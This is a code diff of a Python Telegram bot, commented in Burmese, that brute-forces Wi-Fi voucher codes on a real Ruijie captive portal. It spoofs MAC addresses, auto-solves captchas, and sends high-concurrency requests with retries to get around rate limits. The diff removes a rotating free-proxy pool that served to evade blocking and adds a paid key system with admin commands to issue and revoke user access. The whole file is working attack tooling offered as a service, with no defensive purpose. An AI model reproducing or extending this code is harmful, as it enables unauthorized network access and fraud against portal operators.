@@ -10,6 +10,7 @@ from datetime import datetime, timedelta, timezone
 # ── Environment variables ─────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
+ADMIN_ID = os.environ.get("ADMIN_ID", "")
 REPO_OWNER = os.environ.get("REPO_OWNER", "")
 REPO_NAME = os.environ.get("REPO_NAME", "")
 
@@ -17,36 +18,16 @@ REPO_NAME = os.environ.get("REPO_NAME", "")
 PORTAL_HOST = "portal-mm-as.ruijienetworks.com"
 PORTAL_BASE = f"https://{PORTAL_HOST}"
 
-# ── Performance config (1GB RAM tuned) ────────────────────────────────────
-CONCURRENCY = 1500
-BATCH_SIZE = 2500
-CAPTCHA_RETRY = 4
-REQUEST_RETRY = 2
-POOL_SIZE = 200
-
-# ── Proxy config ──────────────────────────────────────────────────────────
-ENABLE_PROXY = True                  # False ထားရင် proxy မသုံး
-PROXY_REFRESH_INTERVAL = 180         # ၃ မိနစ်တစ်ကြိမ် refresh
-PROXY_VALIDATE_CONCURRENCY = 300     # validation concurrent
-PROXY_VALIDATE_TIMEOUT = 5           # validation timeout (s)
-PROXY_VALIDATE_URL = "http://httpbin.org/ip"
-
-PROXY_SOURCES = [
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
-    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
-    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-]
-
 # ── Global structures ─────────────────────────────────────────────────────
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 
 user_data = {}
+approve = {}
 scan_tasks = {}
 success_texts = {}
 limited_texts = {}
+captcha_state = {}
 
 notify_setting = {}
 DEFAULT_NOTIFY = True
@@ -57,132 +38,11 @@ limited_messages = {}
 
 session = None
 _connector = None
+CONCURRENCY = 500
 _voucher_sem = None
-_session_pool = None
 _start_time = time.monotonic()
 
-# ── Dynamic Proxy Rotator ─────────────────────────────────────────────────
-class DynamicProxyRotator:
-    def __init__(self):
-        self.proxies = []
-        self.lock = asyncio.Lock()
-        self.last_refresh = 0
-        self._cycle = None
-        self.total_fetched = 0
-        self.total_valid = 0
-
-    async def fetch_proxies(self):
-        all_proxies = set()
-
-        async def fetch_one(url):
-            try:
-                async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                    if resp.status == 200:
-                        text = await resp.text()
-                        for line in text.splitlines():
-                            line = line.strip()
-                            if not line or line.startswith("#"):
-                                continue
-                            # Format: ip:port or http://ip:port
-                            if "://" not in line:
-                                line = f"http://{line}"
-                            # Basic validation
-                            if re.match(r'^https?://[\d\.]+:\d+$', line):
-                                all_proxies.add(line)
-            except Exception as e:
-                print(f"[proxy-fetch] {url[:60]}... → {e}")
-
-        await asyncio.gather(*[fetch_one(u) for u in PROXY_SOURCES], return_exceptions=True)
-        return list(all_proxies)
-
-    async def validate_proxy(self, proxy):
-        try:
-            timeout = aiohttp.ClientTimeout(total=PROXY_VALIDATE_TIMEOUT)
-            async with aiohttp.ClientSession(
-                timeout=timeout, connector=_connector, connector_owner=False
-            ) as s:
-                async with s.get(PROXY_VALIDATE_URL, proxy=proxy) as resp:
-                    if resp.status == 200:
-                        return proxy
-        except Exception:
-            pass
-        return None
-
-    async def refresh(self):
-        if not ENABLE_PROXY:
-            return
-        async with self.lock:
-            print(f"[proxy] 🔄 Fetching candidates...")
-            fetched = await self.fetch_proxies()
-            self.total_fetched = len(fetched)
-            print(f"[proxy] 📥 Fetched {len(fetched)} candidates, validating...")
-
-            if not fetched:
-                return
-
-            # Random sample to avoid validating 10000+ proxies (slow)
-            if len(fetched) > 3000:
-                fetched = random.sample(fetched, 3000)
-
-            sem = asyncio.Semaphore(PROXY_VALIDATE_CONCURRENCY)
-
-            async def _val(p):
-                async with sem:
-                    return await self.validate_proxy(p)
-
-            results = await asyncio.gather(*[_val(p) for p in fetched], return_exceptions=True)
-            valid = [r for r in results if r and isinstance(r, str)]
-
-            if valid:
-                self.proxies = valid
-                random.shuffle(self.proxies)
-                self._cycle = itertools.cycle(self.proxies)
-                self.last_refresh = time.monotonic()
-                self.total_valid = len(valid)
-                print(f"[proxy] ✅ {len(valid)} working proxies loaded")
-            else:
-                print(f"[proxy] ⚠️ No working proxies found this round")
-
-    def get(self):
-        if not ENABLE_PROXY or not self._cycle:
-            return None
-        try:
-            return next(self._cycle)
-        except StopIteration:
-            return None
-
-    def mark_bad(self, proxy):
-        if proxy in self.proxies:
-            try:
-                self.proxies.remove(proxy)
-                if self.proxies:
-                    self._cycle = itertools.cycle(self.proxies)
-                else:
-                    self._cycle = None
-                print(f"[proxy] ❌ Removed bad proxy (remaining: {len(self.proxies)})")
-            except Exception:
-                pass
-
-    def stats(self):
-        return {
-            "enabled": ENABLE_PROXY,
-            "alive": len(self.proxies),
-            "last_refresh": int(time.monotonic() - self.last_refresh) if self.last_refresh else -1,
-        }
-
-proxy_rotator = DynamicProxyRotator()
-
-async def proxy_refresh_loop():
-    """Background task: refresh proxy pool periodically."""
-    await asyncio.sleep(5)  # initial warm-up
-    while True:
-        try:
-            await proxy_rotator.refresh()
-        except Exception as e:
-            print(f"[proxy-refresh] error: {e}")
-        await asyncio.sleep(PROXY_REFRESH_INTERVAL)
-
-# ── Web server ────────────────────────────────────────────────────────────
+# ── Web server (keep alive) ────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
 
@@ -192,51 +52,13 @@ async def web_server():
         app.router.add_get('/', handle)
         runner = web.AppRunner(app)
         await runner.setup()
+        # Railway က PORT ကို dynamic ပေးတယ်
         port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
         site = web.TCPSite(runner, '0.0.0.0', port)
         await site.start()
         print(f"✅ Web server started on port {port}")
     except Exception as e:
         print(f"❌ Web server error: {e}")
-
-# ── Session pool (for direct mode) ────────────────────────────────────────
-def _new_session():
-    return aiohttp.ClientSession(
-        connector=_connector,
-        connector_owner=False,
-        cookie_jar=aiohttp.CookieJar(),
-        timeout=aiohttp.ClientTimeout(total=30)
-    )
-
-async def init_session_pool():
-    global _session_pool
-    _session_pool = asyncio.Queue()
-    for _ in range(POOL_SIZE):
-        await _session_pool.put(_new_session())
-    print(f"✅ Session pool ready: {POOL_SIZE}")
-
-async def get_pooled_session():
-    try:
-        if _session_pool is not None:
-            return _session_pool.get_nowait()
-    except asyncio.QueueEmpty:
-        pass
-    return _new_session()
-
-async def release_pooled_session(s):
-    if s is None:
-        return
-    try:
-        s.cookie_jar.clear()
-    except:
-        pass
-    if _session_pool is not None and _session_pool.qsize() < POOL_SIZE * 2:
-        await _session_pool.put(s)
-    else:
-        try:
-            await s.close()
-        except:
-            pass
 
 # ── GitHub helpers ─────────────────────────────────────────────────────────
 async def get_file_content(path):
@@ -269,6 +91,44 @@ async def update_file_content(path, content, sha, message):
         return None
 
 # ── Helper functions ───────────────────────────────────────────────────────
+def check_key_expiration(expiration_time):
+    try:
+        if isinstance(expiration_time, dict):
+            expiry = expiration_time.get("expires_at")
+            if expiry == "9999-12-31T23:59:59Z":
+                return True
+            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
+            return datetime.now(timezone.utc) < exp_time
+        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
+        expiration_dt = datetime(
+            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
+            second=0, tzinfo=timezone.utc
+        )
+        return datetime.now(timezone.utc) < expiration_dt
+    except Exception as e:
+        print("Key parse error:", e)
+        return False
+
+def generate_expiry(plan):
+    now = datetime.now(timezone.utc)
+    if plan == "unlimited":
+        return "9999-12-31T23:59:59Z"
+    total_seconds = 0
+    parts = re.findall(r'(\d+)([dhm])', plan)
+    if not parts:
+        return None
+    for val, unit in parts:
+        val = int(val)
+        if unit == 'd':
+            total_seconds += val * 86400
+        elif unit == 'h':
+            total_seconds += val * 3600
+        elif unit == 'm':
+            total_seconds += val * 60
+    if total_seconds == 0:
+        return None
+    return (now + timedelta(seconds=total_seconds)).isoformat()
+
 def plan_to_minutes(s):
     if not s:
         return 0
@@ -433,7 +293,7 @@ def get_mac():
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
-async def get_session_id(session_obj, session_url, previous_session_id=None, proxy=None):
+async def get_session_id(session_obj, session_url, previous_session_id=None):
     mac = get_mac()
     url = replace_mac(session_url, new_mac=mac)
     headers = {
@@ -443,15 +303,14 @@ async def get_session_id(session_obj, session_url, previous_session_id=None, pro
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
     }
     try:
-        async with session_obj.get(url, headers=headers, allow_redirects=True,
-                                    proxy=proxy) as req:
+        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
             response = str(req.url)
             sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
             return sid.group(1) if sid else previous_session_id
     except:
         return previous_session_id
 
-async def Captcha_Image(session_obj, session_id, proxy=None):
+async def Captcha_Image(session_obj, session_id):
     headers = {
         'authority': PORTAL_HOST,
         'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
@@ -464,10 +323,10 @@ async def Captcha_Image(session_obj, session_id, proxy=None):
     }
     params = {'sessionId': session_id, '_t': str(time.time())}
     async with session_obj.get(f'{PORTAL_BASE}/api/auth/captcha/image',
-                               params=params, headers=headers, proxy=proxy) as req:
+                               params=params, headers=headers) as req:
         return await req.read()
 
-async def Varify_Captcha(session_obj, session_id, text, proxy=None):
+async def Varify_Captcha(session_obj, session_id, text):
     headers = {
         'authority': PORTAL_HOST,
         'accept': '*/*',
@@ -482,7 +341,7 @@ async def Varify_Captcha(session_obj, session_id, text, proxy=None):
     }
     json_data = {'sessionId': session_id, 'authCode': text}
     async with session_obj.post(f'{PORTAL_BASE}/api/auth/captcha/verify',
-                                headers=headers, json=json_data, proxy=proxy) as req:
+                                headers=headers, json=json_data) as req:
         data = await req.json()
         return session_id if data.get("success") == True else None
 
@@ -499,9 +358,8 @@ async def check_session_url(session_url):
     except:
         return False
 
-# ── Core voucher check (with proxy) ───────────────────────────────────────
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
-                        message=None, plan_filters=None):
+# ── Core voucher check ─────────────────────────────────────────────────────
+async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
     global _connector
     if not recheck:
         current_task = scan_tasks.get(chat_id)
@@ -512,46 +370,29 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 
     response = None
     session_id = None
-
-    # Get a proxy for this check (None = direct)
-    proxy_url = proxy_rotator.get()
-    use_pool = proxy_url is None  # pool only for direct mode
-
-    for attempt in range(REQUEST_RETRY):
-        # Session: pooled (direct) or fresh (proxy)
-        if use_pool:
-            task_session = await get_pooled_session()
-        else:
-            task_session = aiohttp.ClientSession(
-                connector=_connector, connector_owner=False,
-                cookie_jar=aiohttp.CookieJar(),
-                timeout=aiohttp.ClientTimeout(total=30)
-            )
-
-        try:
-            session_id = await get_session_id(task_session, session_url, proxy=proxy_url)
+    for attempt in range(3):
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(
+            connector=_connector, connector_owner=False,
+            cookie_jar=aiohttp.CookieJar(), timeout=timeout
+        ) as task_session:
+            session_id = await get_session_id(task_session, session_url)
             if not session_id:
-                if proxy_url:
-                    proxy_rotator.mark_bad(proxy_url)
-                    proxy_url = proxy_rotator.get()
                 continue
 
             auth_code = None
-            for _ in range(CAPTCHA_RETRY):
+            for _ in range(8):
                 try:
-                    image = await Captcha_Image(task_session, session_id, proxy=proxy_url)
+                    image = await Captcha_Image(task_session, session_id)
                     text = await Captcha_Text(image)
                     if not text:
                         continue
-                    if await Varify_Captcha(task_session, session_id, text, proxy=proxy_url):
+                    if await Varify_Captcha(task_session, session_id, text):
                         auth_code = text
                         break
                 except:
                     continue
             if not auth_code:
-                if proxy_url:
-                    proxy_rotator.mark_bad(proxy_url)
-                    proxy_url = proxy_rotator.get()
                 continue
 
             if not recheck:
@@ -578,25 +419,18 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
             }
             try:
-                async with task_session.post(post_url, json=data, headers=headers,
-                                              proxy=proxy_url) as req:
+                async with task_session.post(post_url, json=data, headers=headers) as req:
                     response = await req.text()
+                    try:
+                        resp_json = json.loads(response)
+                        print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
+                    except:
+                        pass
             except:
-                response = None
-                if proxy_url:
-                    proxy_rotator.mark_bad(proxy_url)
-                    proxy_url = proxy_rotator.get()
-        finally:
-            if use_pool:
-                await release_pooled_session(task_session)
-            else:
-                try:
-                    await task_session.close()
-                except:
-                    pass
+                return
 
         if response and 'request limited' in response:
-            await asyncio.sleep(random.uniform(0.5, 1.5))
+            await asyncio.sleep(random.uniform(1, 3))
             continue
         break
 
@@ -679,6 +513,7 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
 
     checked = 0
     found = 0
+    last_key_check = time.monotonic()
     scan_start = time.monotonic()
 
     global _voucher_sem
@@ -699,13 +534,23 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
                 return
 
             batch = []
-            for _ in range(BATCH_SIZE):
+            for _ in range(1000):
                 try:
                     batch.append(next(code_iter))
                 except StopIteration:
                     break
             if not batch:
                 break
+
+            if time.monotonic() - last_key_check >= 600:
+                auth_list, _ = await get_file_content("auth_list.json")
+                if (str(chat_id) not in auth_list
+                        or not check_key_expiration(auth_list[str(chat_id)])):
+                    approve[chat_id] = False
+                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
+                    scan_tasks.pop(chat_id, None)
+                    return
+                last_key_check = time.monotonic()
 
             async def _check(code):
                 async with _voucher_sem:
@@ -806,23 +651,24 @@ async def help_cmd(message):
         "**၆။** `/saved` – ရလဒ်ကြည့်ခြင်း\n"
         "**၇။** `/delete_saved` – ရလဒ်ဖျက်ခြင်း\n"
         "**၈။** `/recheck` – Success codes ပြန်စစ်ခြင်း\n"
-        "**၉။** `/notify` – Notification ON/OFF\n"
-        "**၁၀။** `/proxy` – Proxy အခြေအနေကြည့်"
+        "**၉။** `/notify` – Notification ON/OFF"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
 
-@bot.message_handler(commands=['proxy'])
-async def proxy_status(message):
-    s = proxy_rotator.stats()
-    status_text = (
-        f"🌐 **Proxy Status**\n\n"
-        f"Enabled: {'✅' if s['enabled'] else '❌'}\n"
-        f"Alive: `{s['alive']}`\n"
-        f"Last Refresh: `{s['last_refresh']}s ago`\n"
-        f"Fetched (last): `{proxy_rotator.total_fetched}`\n"
-        f"Valid (last): `{proxy_rotator.total_valid}`\n"
-    )
-    await bot.reply_to(message, status_text, parse_mode="Markdown")
+@bot.message_handler(commands=['key'])
+async def handle_key(message):
+    key = str(message.chat.id)
+    auth_list, _ = await get_file_content("auth_list.json")
+    if key in auth_list:
+        if check_key_expiration(auth_list[key]):
+            approve[message.chat.id] = True
+            user_data[message.chat.id] = {}
+            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
+        else:
+            approve[message.chat.id] = False
+            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
+    else:
+        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")
 
 @bot.message_handler(commands=['setup'])
 async def handle_setup(message):
@@ -831,6 +677,9 @@ async def handle_setup(message):
         await bot.reply_to(message, "အသုံးပြုနည်း:\n`/setup your_session_url`", parse_mode="Markdown")
         return
     url = args[1]
+    if not approve.get(message.chat.id, False):
+        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
+        return
     await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
     if await check_session_url(url):
         cid = message.chat.id
@@ -894,6 +743,9 @@ async def brute(message):
             return
 
     chat_id = message.chat.id
+    if not approve.get(chat_id, False):
+        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
+        return
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
         await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
         return
@@ -1054,6 +906,9 @@ async def toggle_notify(message):
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
     chat_id = message.chat.id
+    if not approve.get(chat_id, False):
+        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
+        return
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
         await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
         return
@@ -1082,22 +937,108 @@ async def recheck(message):
 
 @bot.message_handler(commands=['status'])
 async def status(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "No Permission")
+        return
     active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
+    approved_users = sum(1 for v in approve.values() if v)
     uptime_seconds = int(time.monotonic() - _start_time)
     hours, remainder = divmod(uptime_seconds, 3600)
     minutes, seconds = divmod(remainder, 60)
-    pool_size = _session_pool.qsize() if _session_pool else 0
-    ps = proxy_rotator.stats()
     await bot.reply_to(
         message,
         f"📊 Bot Status\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
         f"🔍 Active Scans: {active_scans}\n"
-        f"👥 Sessions Loaded: {len(user_data)}\n"
-        f"⚙️ Concurrency: {CONCURRENCY}\n"
-        f"🔋 Pool Available: {pool_size}/{POOL_SIZE}\n\n"
-        f"🌐 Proxy: {'✅' if ps['enabled'] else '❌'} | Alive: {ps['alive']} | Refresh: {ps['last_refresh']}s ago"
+        f"✅ Approved Users: {approved_users}\n"
+        f"👥 Sessions Loaded: {len(user_data)}"
     )
+
+@bot.message_handler(commands=['genkey'])
+async def genkey(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "No Permission")
+        return
+    args = message.text.split()
+    if len(args) < 3:
+        await bot.reply_to(message, "Usage:\n`/genkey 1h30m 123456789`\n`/genkey unlimited 123456789`",
+                           parse_mode="Markdown")
+        return
+    plan = args[1]
+    user_id = args[2]
+    expiry = generate_expiry(plan)
+    if not expiry:
+        await bot.reply_to(message, "Duration ပုံစံမမှန်ပါ။ ဥပမာ: 30m, 1h, 2d, 1h30m, unlimited")
+        return
+    auth_list, sha = await get_file_content("auth_list.json")
+    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
+    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
+    await bot.reply_to(message, f"✅ Key Generated\n\nUSER ID : `{user_id}`\nPLAN : {plan}\nEXPIRES : {expiry}",
+                       parse_mode="Markdown")
+
+@bot.message_handler(commands=['delkey'])
+async def delkey(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "No Permission")
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await bot.reply_to(message, "Usage:\n`/delkey 123456789`", parse_mode="Markdown")
+        return
+    user_id = args[1]
+    auth_list, sha = await get_file_content("auth_list.json")
+    if user_id not in auth_list:
+        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
+        return
+    del auth_list[user_id]
+    await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
+    approve.pop(int(user_id), None)
+    user_data.pop(int(user_id), None)
+    await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : `{user_id}`", parse_mode="Markdown")
+
+@bot.message_handler(commands=['listkeys'])
+async def listkeys(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "No Permission")
+        return
+    try:
+        auth_list, _ = await get_file_content("auth_list.json")
+        if not auth_list:
+            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
+            return
+        lines = []
+        for uid, data in auth_list.items():
+            if isinstance(data, dict):
+                expires = data.get("expires_at", "unknown")
+                plan = data.get("plan", "unknown")
+                if expires == "9999-12-31T23:59:59Z":
+                    expires_str = "Unlimited"
+                else:
+                    try:
+                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
+                        now = datetime.now(timezone.utc)
+                        if exp_dt < now:
+                            expires_str = "Expired"
+                        else:
+                            diff = exp_dt - now
+                            days = diff.days
+                            hours, rem = divmod(diff.seconds, 3600)
+                            minutes = rem // 60
+                            expires_str = f"{days}d {hours}h {minutes}m left"
+                    except:
+                        expires_str = expires
+            else:
+                plan = "old"
+                expires_str = str(data)
+            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
+        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
+        if len(text) > 4096:
+            for i in range(0, len(text), 4096):
+                await bot.send_message(message.chat.id, text[i:i+4096])
+        else:
+            await bot.reply_to(message, text)
+    except Exception as e:
+        print(f"Error at listkeys {e}")
 
 # ── Polling and main ──────────────────────────────────────────────────────
 async def start_polling():
@@ -1118,22 +1059,11 @@ async def start_polling():
 async def main():
     global session, _connector
     timeout = aiohttp.ClientTimeout(total=30)
-    _connector = aiohttp.TCPConnector(
-        limit=3000,
-        limit_per_host=1500,
-        ttl_dns_cache=600,
-        ssl=False,
-        keepalive_timeout=60,
-        force_close=False,
-        enable_cleanup_closed=True
-    )
+    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
     session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
     try:
-        await init_session_pool()
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
-        if ENABLE_PROXY:
-            asyncio.create_task(proxy_refresh_loop())
         await start_polling()
     finally:
         await session.close()
